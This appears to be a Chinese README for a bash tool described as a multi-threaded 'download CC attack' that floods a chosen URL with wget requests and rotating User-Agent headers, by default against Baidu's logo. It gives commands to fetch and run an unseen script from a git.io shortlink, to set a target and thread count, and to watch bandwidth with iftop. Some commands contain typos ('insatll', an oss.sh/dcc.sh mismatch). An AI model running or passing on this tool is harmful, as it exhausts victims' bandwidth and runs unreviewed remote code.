## 多线程刷流量 Download cc attack
  
  会自动更换UA头，多线程下载
 
#### 下载安装:
  
  默认会刷百度logo
``` bash
  wget -O dcc.sh git.io/Jftkm
  bash dcc.sh &
```

&nbsp;

  如果需要改为别的地址可以这样
 
```shell
  wget -O dcc.sh git.io/Jftkm
  bash dcc.sh "https://www.baidu.com" &  #指定url
  bash oss.sh "https://www.baidu.com" 8 & #指定url和8线程
```

&nbsp;
  
#### 查看使用流量（执行此命令起）
```shell
  apt install -y iftop && iftop -i eth0
  yum install -y iftop && iftop -i eth0
```

#### 如果网卡不是eth0可以改一下，看网卡名可以用这条命令

```shell
  apt insatll -y net-tools && ifconfig
  yum insatll -y net-tools && ifconfig
```

#### 结束命令
```shell
  pkill bash && pkill wget
```
